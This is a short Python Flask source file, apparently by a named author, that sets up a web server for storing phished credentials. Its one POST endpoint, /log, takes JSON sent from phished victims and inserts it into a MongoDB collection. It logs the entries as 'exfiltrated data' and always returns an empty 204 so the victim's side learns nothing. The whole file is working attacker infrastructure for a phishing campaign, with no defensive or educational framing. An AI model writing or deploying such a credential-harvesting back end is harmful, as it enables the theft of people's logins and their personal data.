#!/usr/bin/python
# This file contains code that defines a RESTful web server for logging phished information
# 
# Author: Josh McIntyre
#
import flask
import logging
import pymongo

import auth

# Define the base Flask application
app = flask.Flask(__name__)

# This block generates a database connection
conn_string = "mongodb://" + auth.USER + ":" + auth.PASSWORD + "@localhost/" + auth.DATABASE
connection = pymongo.MongoClient(conn_string)
database = connection[auth.DATABASE]
collection = database[auth.COLLECTION]

# Logging related configuration
logging.basicConfig(level=logging.INFO)

# URL handlers

# This function handles POST on the log page
@app.post("/log")
def login_post():
    return handle_log()

# Helper functions

# Handle login
def handle_log():

    json_data = flask.request.json
    log_credential(json_data)

    # Always return 204
    # No need for our phished client to know anything about the exfiltrated data
    return {}, 204

# Insert a phished credential into the database
def log_credential(json_data):

    try:
        collection.insert_one(json_data)
        logging.info("Logged exfiltrated data from request")
    except Exception: 
        logging.error("Unable to log exfiltrated data")
    